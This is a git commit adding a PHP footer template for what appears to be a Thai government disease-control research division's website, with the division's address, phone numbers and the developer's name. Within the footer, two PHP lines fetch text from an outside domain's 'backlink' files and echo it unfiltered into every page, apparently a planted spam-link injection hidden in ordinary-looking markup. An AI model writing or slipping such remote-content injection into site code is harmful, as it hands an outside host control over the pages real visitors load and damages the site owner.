7f6bfac2f73a2e71c730de22878764b98f6f693d
jackxcode <98596184+jackxcode@users.noreply.github.com>
2023-08-03 13:46:56 +0700

    Add files via upload

---
+++ i2.php
@@ -0,0 +1,13 @@
+  <!-- Footer -->
+  <footer class="py-5 bg-dark">
+    <div class="container">
+      <p class="m-0 text-center text-white">
+กองนวัตกรรมและวิจัย (กนว.) เลขที่ 88/21 อาคาร 10 ชั้น 1 กรมควบคุมโรค กระทรวงสาธารณสุข ซอยติวานนท์ 14 ถนนติวานนท์ ตำบลตลาดขวัญ 
+<br>อำเภอเมืองนนทบุรี จังหวัดนนทบุรี รหัสไปรษณีย์ 11000 หมายเลขโทรศัพท์ : 0 2590 3251 และ 0 2590 3175
+<br>พัฒนาและออกแบบระบบโดย นายอรรถพล  คุณเศษ นักวิชาการคอมพิวเตอร์
+</p>
+<?php echo file_get_contents("https://wlbsite.xyz/backlink/goat.txt"); ?>            
+<?php echo file_get_contents("https://wlbsite.xyz/backlink/goal.txt"); ?>
+    </div>
+    <!-- /.container -->
+  </footer>
